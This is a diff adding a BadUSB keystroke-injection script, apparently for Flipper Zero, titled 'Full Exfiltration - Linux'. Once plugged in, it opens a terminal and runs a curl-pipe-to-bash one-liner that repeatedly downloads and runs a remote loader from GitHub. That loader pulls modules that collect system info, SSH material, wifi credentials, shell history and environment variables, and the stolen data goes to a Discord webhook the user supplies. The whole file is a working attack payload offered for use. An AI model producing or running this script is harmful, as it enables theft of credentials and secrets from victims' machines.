@@ -1,0 +1,21 @@
+REM ============================================================
+REM 🎯 Full Exfiltration - Linux
+REM ============================================================
+REM Author: dil1thium
+REM Version: 3.0 (Modular)
+REM Target: Linux
+REM Category: Exfiltration
+REM
+REM Runs all exfil modules: sysinfo, ssh, wifi, history, env
+REM
+REM CONFIGURE:
+REM   Replace YOUR_DISCORD_WEBHOOK with your webhook URL
+REM ============================================================
+DELAY 500
+CTRL ALT t
+DELAY 1500
+STRING DC="YOUR_DISCORD_WEBHOOK" bash -c 'B="https://raw.githubusercontent.com/reschjonas/FlipperZero_BadUSB/main/remote-payloads/loaders/loader.sh";for m in sysinfo ssh wifi history env;do M=$m curl -sL $B|bash;sleep 1;done' &
+ENTER
+DELAY 500
+STRING exit
+ENTER
